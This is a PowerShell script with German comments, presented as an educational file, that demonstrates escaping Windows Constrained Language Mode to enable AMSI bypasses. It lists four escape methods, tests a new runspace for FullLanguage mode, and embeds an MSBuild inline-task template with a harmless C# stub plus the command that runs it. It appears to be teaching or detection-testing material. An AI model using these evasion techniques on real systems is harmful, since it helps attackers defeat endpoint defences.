# AMSI Bypass: CLM (Constrained Language Mode) Escape + AMSI
# =============================================================
# ACHTUNG: Dies ist eine BILDUNGSDATEI. Nicht auf Produktivsystemen ausfuehren!
#
# TECHNIK: In Constrained Language Mode (CLM) sind .NET-Typen eingeschraenkt.
# Wenn ein Angreifer CLM umgeht, kann er auch AMSI-Bypasses ausfuehren.
#
# WARUM ES FUNKTIONIERT:
# CLM verhindert Zugriff auf beliebige .NET-Typen -- aber es gibt Escapes:
# 1. Custom Runspaces (neuer Runspace im FullLanguage Mode)
# 2. MSBuild Inline Tasks (C# Code ohne PowerShell-Restriktionen)
# 3. InstallUtil /LogToConsole=false /U (Custom .NET Assembly)
# 4. Add-Type mit C# Code (manchmal erlaubt)
#
# ERKENNUNG:
# - Unser Scanner erkennt "Invoke-Expression" als suspicious
# - CLM-Escapes sind schwer zu erkennen ohne Verhaltensanalyse

Write-Host "=== CLM Status Check ==="
Write-Host "Current Language Mode: $($ExecutionContext.SessionState.LanguageMode)"

if ($ExecutionContext.SessionState.LanguageMode -eq "ConstrainedLanguage") {
    Write-Host "[!] CLM is active - attempting escape..."
    
    # Methode 1: Neuer Runspace im FullLanguage Mode
    $runspace = [RunspaceFactory]::CreateRunspace()
    $runspace.Open()
    $pipeline = $runspace.CreatePipeline()
    $pipeline.Commands.AddScript('$ExecutionContext.SessionState.LanguageMode')
    $result = $pipeline.Invoke()
    Write-Host "    New Runspace Language Mode: $result"
    $runspace.Close()
    
} else {
    Write-Host "[*] FullLanguage Mode - CLM not active"
    Write-Host "[*] AMSI bypass techniques can be used directly"
}

# Methode 2: MSBuild Inline Task (C# code execution without PowerShell)
$msbuildPayload = @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec">
    <SimpleTask />
  </Target>
  <UsingTask TaskName="SimpleTask" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Fragment" Language="cs">
        // C# code runs outside PowerShell - no AMSI, no CLM
        Console.WriteLine("Executing outside PowerShell/AMSI context");
      </Code>
    </Task>
  </UsingTask>
</Project>
"@

Write-Host ""
Write-Host "--- MSBuild Escape Demo ---"
Write-Host "MSBuild inline tasks execute C# directly - bypasses both CLM and AMSI"
Write-Host "Usage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml"
